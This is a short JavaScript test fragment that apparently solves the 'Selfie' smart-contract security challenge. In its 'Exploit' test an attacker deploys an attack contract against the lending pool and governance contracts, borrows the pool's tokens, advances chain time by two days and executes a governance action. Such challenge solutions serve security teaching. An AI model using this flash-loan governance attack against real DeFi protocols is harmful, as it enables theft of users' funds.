...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackContract = await ethers.getContractFactory('SelfieAttack', attacker);
        this.attack = await AttackContract.deploy(this.pool.address,this.governance.address,this.token.address);

        const attackTokenPool = this.attack.connect(attacker);

        await attackTokenPool.attack(TOKENS_IN_POOL);

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);

        await attackTokenPool.executeGov();
    });
